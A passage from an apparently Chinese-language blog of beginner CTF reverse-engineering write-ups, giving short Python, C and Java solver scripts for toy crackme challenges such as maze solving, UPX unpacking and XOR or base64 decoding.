1, 1, 1, 1, 1, 1, 1]</span><br></pre></td></tr></table></figure></p>\n<p>写一个脚本来完成迷宫</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from collections import deque</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">def bfs(maze, start, end):</span><br><span class=\"line\">    # 定义四个移动方向</span><br><span class=\"line\">    directions = [(0, 1, &#x27;d&#x27;), (1, 0, &#x27;s&#x27;), (0, -1, &#x27;a&#x27;), (-1, 0, &#x27;w&#x27;)]</span><br><span class=\"line\"> </span><br><span class=\"line\">    # 队列中的元素是（当前坐标，到达当前坐标的路径）</span><br><span class=\"line\">    queue = deque([(start, [])])</span><br><span class=\"line\"> </span><br><span class=\"line\">    # 创建集合保存已访问的点</span><br><span class=\"line\">    visited = set()</span><br><span class=\"line\">    visited.add(start)</span><br><span class=\"line\"> </span><br><span class=\"line\">    while queue:</span><br><span class=\"line\">        # 当前位置和路径</span><br><span class=\"line\">        (x, y), path = queue.popleft()</span><br><span class=\"line\"> </span><br><span class=\"line\">        for dx, dy, direction in directions:</span><br><span class=\"line\">            # 下一个可能的位置</span><br><span class=\"line\">            next_x, next_y = x + dx, y + dy</span><br><span class=\"line\"> </span><br><span class=\"line\">            # 如果这个位置在迷宫范围内并且没有被访问过</span><br><span class=\"line\">            if 0 &lt;= next_x &lt; len(maze) and 0 &lt;= next_y &lt; len(maze[0]) and (next_x, next_y) not in visited:</span><br><span class=\"line\">                if maze[next_x][next_y] == 0 or (next_x, next_y) == end:</span><br><span class=\"line\">                    visited.add((next_x, next_y))  # 标记为已访问</span><br><span class=\"line\">                    new_path = path + [direction]  # 新路径添加移动方向</span><br><span class=\"line\"> </span><br><span class=\"line\">                    # 如果到达终点，则返回路径</span><br><span class=\"line\">                    if (next_x, next_y) == end:</span><br><span class=\"line\">                        return new_path</span><br><span class=\"line\"> </span><br><span class=\"line\">                    # 否则，将新位置和新路径添加到队列中</span><br><span class=\"line\">                    queue.append(((next_x, next_y), new_path))</span><br><span class=\"line\"> </span><br><span class=\"line\">    # 如果所有可能都走完了还没找到终点，那么返回 None</span><br><span class=\"line\">    return None</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"># 定义迷宫</span><br><span class=\"line\">maze = [</span><br><span class=\"line\">[1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1],</span><br><span class=\"line\">[1,   0,   0,   0,   0,   0,   1,   1,   1,   1,   1,   1,   0,   1,   1,   1],</span><br><span class=\"line\">[1,   0,   1,   1,   1,   0,   1,   1,   1,   1,   1,   1,   0,   1,   1,   1],</span><br><span class=\"line\">[1,   0,   1,   1,   1,   0,   1,   1,   0,   0,   0,   1,   0,   1,   1,   1],</span><br><span class=\"line\">[1,   0,   1,   1,   1,   0,   1,   1,   0,   1,   0,   1,   0,   1,   1,   1],</span><br><span class=\"line\">[1,   0,   1,   1,   1,   0,   0,   0,   0,   1,   0,   1,   0,   1,   1,   1],</span><br><span class=\"line\">[1,   0,   1,   1,   1,   1,   1,   1,   0,   1,   0,   1,   0,   1,   1,   1],</span><br><span class=\"line\">[1,   0,   1,   1,   1,   1,   1,   1,   0,   0,   0,   1,   0,   1,   1,   1],</span><br><span class=\"line\">[1,   0,   1,   1,   1,   1,   1,   1,   1,   0,   1,   1,   0,   1,   1,   1],</span><br><span class=\"line\">[1,   0,   1,   1,   1,   1,   1,   1,   1,   0,   1,   1,   0,   1,   1,   1],</span><br><span class=\"line\">[1,   0,   0,   0,   0,   1,   1,   0,   0,   0,   0,   1,   0,   0,   0,   1],</span><br><span class=\"line\">[1,   1,   1,   1,   0,   1,   1,   1,   1,   0,   1,   1,   0,   1,   0,   1],</span><br><span class=\"line\">[1,   1,   1,   1,   0,   1,   1,   1,   1,   0,   1,   1,   0,   1,   0,   1],</span><br><span class=\"line\">[1,   0,   0,   0,   0,   1,   1,   1,   1,   0,   1,   1,   0,   1,   0,   0],</span><br><span class=\"line\">[1,   0,   1,   1,   1,   1,   1,   1,   1,   0,   0,   0,   0,   1,   1,   1],</span><br><span class=\"line\">[1,   0,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1,   1]</span><br><span class=\"line\">]</span><br><span class=\"line\"> </span><br><span class=\"line\"># 寻找起点</span><br><span class=\"line\">start = (15,1)</span><br><span class=\"line\">end = (13,15)</span><br><span class=\"line\"># 执行广度优先搜索</span><br><span class=\"line\">path = bfs(maze, start,end)</span><br><span class=\"line\"> </span><br><span class=\"line\">if path:</span><br><span class=\"line\">    print(&quot;Found path:&quot;, &#x27;&#x27;.join(path))</span><br><span class=\"line\">else:</span><br><span class=\"line\">    print(&quot;No path found with the exact length of 54.&quot;)</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"swpuctf-2022-新生赛upx\"><a class=\"anchor\" href=\"#swpuctf-2022-新生赛upx\">#</a> [SWPUCTF 2022 新生赛] upx</h4>\n<p>upx -d 脱壳然后 xor2 即可得到 flag</p>\n<h4 id=\"swpuctf-2021-新生赛老鼠走迷宫\"><a class=\"anchor\" href=\"#swpuctf-2021-新生赛老鼠走迷宫\">#</a> [SWPUCTF 2021 新生赛] 老鼠走迷宫</h4>\n<p>拖入 ida 发现这个是一个 python 安装的题目使用 pyinstxtractor 得到 pyc 后使用 uncompyle6 即可得到源代码需要使用特定的头</p>\n<p>使用代码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from collections import deque</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">def bfs(maze, start, end):</span><br><span class=\"line\">    # 定义四个移动方向</span><br><span class=\"line\">    directions = [(0, 1, &#x27;d&#x27;), (1, 0, &#x27;s&#x27;), (0, -1, &#x27;a&#x27;), (-1, 0, &#x27;w&#x27;)]</span><br><span class=\"line\"> </span><br><span class=\"line\">    # 队列中的元素是（当前坐标，到达当前坐标的路径）</span><br><span class=\"line\">    queue = deque([(start, [])])</span><br><span class=\"line\"> </span><br><span class=\"line\">    # 创建集合保存已访问的点</span><br><span class=\"line\">    visited = set()</span><br><span class=\"line\">    visited.add(start)</span><br><span class=\"line\"> </span><br><span class=\"line\">    while queue:</span><br><span class=\"line\">        # 当前位置和路径</span><br><span class=\"line\">        (x, y), path = queue.popleft()</span><br><span class=\"line\"> </span><br><span class=\"line\">        for dx, dy, direction in directions:</span><br><span class=\"line\">            # 下一个可能的位置</span><br><span class=\"line\">            next_x, next_y = x + dx, y + dy</span><br><span class=\"line\"> </span><br><span class=\"line\">            # 如果这个位置在迷宫范围内并且没有被访问过</span><br><span class=\"line\">            if 0 &lt;= next_x &lt; len(maze) and 0 &lt;= next_y &lt; len(maze[0]) and (next_x, next_y) not in visited:</span><br><span class=\"line\">                if maze[next_x][next_y] == 0 or (next_x, next_y) == end:</span><br><span class=\"line\">                    visited.add((next_x, next_y))  # 标记为已访问</span><br><span class=\"line\">                    new_path = path + [direction]  # 新路径添加移动方向</span><br><span class=\"line\"> </span><br><span class=\"line\">                    # 如果到达终点，则返回路径</span><br><span class=\"line\">                    if (next_x, next_y) == end:</span><br><span class=\"line\">                        return new_path</span><br><span class=\"line\"> </span><br><span class=\"line\">                    # 否则，将新位置和新路径添加到队列中</span><br><span class=\"line\">                    queue.append(((next_x, next_y), new_path))</span><br><span class=\"line\"> </span><br><span class=\"line\">    # 如果所有可能都走完了还没找到终点，那么返回 None</span><br><span class=\"line\">    return None</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"># 定义迷宫</span><br><span class=\"line\">maze = [</span><br><span class=\"line\"> [1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1],</span><br><span class=\"line\"> [1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1],</span><br><span class=\"line\"> [1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1],</span><br><span class=\"line\"> [1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1],</span><br><span class=\"line\"> [1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1],</span><br><span class=\"line\"> [1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1],</span><br><span class=\"line\"> [1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1],</span><br><span class=\"line\"> [1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1],</span><br><span class=\"line\"> [1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1],</span><br><span class=\"line\"> [1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1],</span><br><span class=\"line\"> [1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1],</span><br><span class=\"line\"> [1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1],</span><br><span class=\"line\"> [1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1],</span><br><span class=\"line\"> [1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1],</span><br><span class=\"line\"> [1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1],</span><br><span class=\"line\"> [1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1],</span><br><span class=\"line\"> [1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1],</span><br><span class=\"line\"> [1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1],</span><br><span class=\"line\"> [1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1],</span><br><span class=\"line\"> [1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1],</span><br><span class=\"line\"> [1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1],</span><br><span class=\"line\"> [1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1],</span><br><span class=\"line\"> [1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1],</span><br><span class=\"line\"> [1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1],</span><br><span class=\"line\"> [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1]]</span><br><span class=\"line\"> </span><br><span class=\"line\"># 寻找起点</span><br><span class=\"line\">start = (1,0)</span><br><span class=\"line\">end = (24,23)</span><br><span class=\"line\"># 执行广度优先搜索</span><br><span class=\"line\">path = bfs(maze, start,end)</span><br><span class=\"line\"> </span><br><span class=\"line\">if path:</span><br><span class=\"line\">    print(&quot;Found path:&quot;, &#x27;&#x27;.join(path))</span><br><span class=\"line\">else:</span><br><span class=\"line\">    print(&quot;No path found with the exact length of 54.&quot;)</span><br></pre></td></tr></table></figure></p>\n<p>即可得到 flag</p>\n<h4 id=\"reverse2\"><a class=\"anchor\" href=\"#reverse2\">#</a> reverse2</h4>\n<p>替换掉 r 和 i 为 1 即可得到 flag</p>\n<h4 id=\"内涵的软件\"><a class=\"anchor\" href=\"#内涵的软件\">#</a> 内涵的软件</h4>\n<p>这个是 strings 直接得到 flag</p>\n<h4 id=\"新年快乐\"><a class=\"anchor\" href=\"#新年快乐\">#</a> 新年快乐</h4>\n<p>upx 脱壳即可得到 flag</p>\n<h4 id=\"xor\"><a class=\"anchor\" href=\"#xor\">#</a> xor</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=&#x27;f\\nk\\fw&amp;O.@\\x11x\\rZ;U\\x11p\\x19F\\x1Fv\\&quot;M#D\\x0Eg\\x06h\\x0FG2O&#x27;</span><br><span class=\"line\">a=[ord(i) for i in a]</span><br><span class=\"line\">b=&#x27;&#x27;</span><br><span class=\"line\">print(a)</span><br><span class=\"line\">for i in range(len(a)-1):</span><br><span class=\"line\">    a[i]^=a[i+1]</span><br><span class=\"line\">    print(chr(a[i]),end=&quot;&quot;)</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"helloword\"><a class=\"anchor\" href=\"#helloword\">#</a> helloword</h4>\n<p>打开 jadx 即可得到 flag</p>\n<h4 id=\"reverse3\"><a class=\"anchor\" href=\"#reverse3\">#</a> reverse3</h4>\n<p>得到</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">e3nifIH9b_C@n@dH</span><br></pre></td></tr></table></figure></p>\n<p>然后就是他每一位减去了一个值在进行 base64</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import base64</span><br><span class=\"line\">a=&#x27;e3nifIH9b_C@n@dH&#x27;</span><br><span class=\"line\">a=[ord(i) for i in a]</span><br><span class=\"line\">c=&quot;&quot;</span><br><span class=\"line\">for i in range(len(a)):</span><br><span class=\"line\">    a[i]-=i</span><br><span class=\"line\">    c+=chr(a[i])</span><br><span class=\"line\">c=c.encode()</span><br><span class=\"line\">print(base64.b64decode(c))</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"不一样的flag\"><a class=\"anchor\" href=\"#不一样的flag\">#</a> 不一样的 flag</h4>\n<p>迷宫得到 flag</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*1111</span><br><span class=\"line\">01000</span><br><span class=\"line\">01010</span><br><span class=\"line\">00010</span><br><span class=\"line\">1111#</span><br></pre></td></tr></table></figure></p>\n<p>222441144222</p>\n<h4 id=\"simplerev\"><a class=\"anchor\" href=\"#simplerev\">#</a> SimpleRev</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;stdio.h&gt;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">char key[] = &quot;adsfkndcls&quot;; //key字符串是adsfkndcls</span><br><span class=\"line\">char text[] = &quot;killshadow&quot;; //text字符串是killshadow</span><br><span class=\"line\">int i; //定义了变量 i</span><br><span class=\"line\">int v2 = 0;</span><br><span class=\"line\">int v3 = 10;//v3的长度为10 ,因为在大写字母变小写的时候，v3会++，而字符串变了10次。</span><br><span class=\"line\">int v5 = 10;</span><br><span class=\"line\">for (int i = 0; i &lt; v5; i++)//开始循环</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">for (int j = 0; j &lt; 123; j++)//开始第二重循环 j = v1;</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">      if ((j &lt; &#x27;A&#x27; || j &gt; &#x27;Z&#x27;) || (j &lt; &#x27;z&#x27; &amp;&amp; j &gt; &#x27;a&#x27;))//|| 和 &amp;&amp; 交换 &gt; 和 &lt; 交换 ，让j不再那个范围之内</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">      continue;//如果不在范围之内，就跳过本次循环。</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">      if ((j - 39 - key[v3 % 10] + 97) % 26 + 97 == text[i])//执行这个算法，跟text字符串相比，如果相等就输出</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">      printf(&quot;%c&quot;,j);</span><br><span class=\"line\">      v3++;//注意算法里面 v3++，所以这里也要把v3++；</span><br><span class=\"line\">       break;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>需要使用 ida 的 r 来查看</p>\n<h4 id=\"java逆向解密\"><a class=\"anchor\" href=\"#java逆向解密\">#</a> Java 逆向解密</h4>\n<p>代码很简单就是一个 java 的</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// Source code is decompiled from a .class file using FernFlower decompiler.</span><br><span class=\"line\">import java.util.ArrayList;</span><br><span class=\"line\">import java.util.Scanner;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Reverse &#123;</span><br><span class=\"line\">   public Reverse() &#123;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   public static void main(String[] args) &#123;</span><br><span class=\"line\">      Scanner s = new Scanner(System.in);</span><br><span class=\"line\">      System.out.println(&quot;Please input the flag \\uff1a&quot;);</span><br><span class=\"line\">      String str = s.next();</span><br><span class=\"line\">      System.out.println(&quot;Your input is \\uff1a&quot;);</span><br><span class=\"line\">      System.out.println(str);</span><br><span class=\"line\">      char[] stringArr = str.toCharArray();</span><br><span class=\"line\">      Encrypt(stringArr);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   public static void Encrypt(char[] arr) &#123;</span><br><span class=\"line\">      ArrayList&lt;Integer&gt; Resultlist = new ArrayList();</span><br><span class=\"line\"></span><br><span class=\"line\">      for(int i = 0; i &lt; arr.length; ++i) &#123;</span><br><span class=\"line\">         int result = arr[i] + 64 ^ 32;</span><br><span class=\"line\">         Resultlist.add(result);</span><br><span class=\"line\">         System.out.println(Resultlist);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      int[] KEY = new int[]&#123;180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65&#125;;</span><br><span class=\"line\">      ArrayList&lt;Integer&gt; KEYList = new ArrayList();</span><br><span class=\"line\"></span><br><span class=\"line\">      for(int j = 0; j &lt; KEY.length; ++j) &#123;</span><br><span class=\"line\">         KEYList.add(KEY[j]);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      System.out.println(&quot;Result:&quot;);</span><br><span class=\"line\">      if (Resultlist.equals(KEYList)) &#123;</span><br><span class=\"line\">         System.out.println(&quot;Congratulations\\uff01&quot;);</span><br><span class=\"line\">      &#125; else &#123;</span><br><span class=\"line\">         System.err.println(&quot;Error\\uff01&quot;);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>创建了两个数组让两个数组一样即可正确，意思就是</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65</span><br></pre></td></tr></table></figure></p>\n<p>找到原始值</p>\n<p>一开始是 arr [i]+64<sup>32 变成 arr [i]-64</sup>32 即可</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=[180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65]</span><br><span class=\"line\">b=&quot;&quot;</span><br><span class=\"line\">for i in range(len(a)):</span><br><span class=\"line\">    b+=chr(a[i]- 64 ^ 32)</span><br><span class=\"line\">print(b)</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"gxyctf2019luck_guy\"><a class=\"anchor\" href=\"#gxyctf2019luck_guy\">#</a> [GXYCTF2019]luck_guy</h4>\n<p>根据提示 strcat 得到 f1+f2 就等于 flag</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f2=&quot;icug`of\\x7F&quot;</span><br><span class=\"line\">f2=[ord(i) for i in f2]</span><br><span class=\"line\">for i in range(8):</span><br><span class=\"line\">    if i%2==1:</span><br><span class=\"line\">        f2[i]-=2</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        f2[i]-=1</span><br><span class=\"line\">f2=[chr(i) for i in f2]</span><br><span class=\"line\">print(&quot;&quot;.join(f2))</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"刮开有奖\"><a class=\"anchor\" href=\"#刮开有奖\">#</a> 刮开有奖</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span 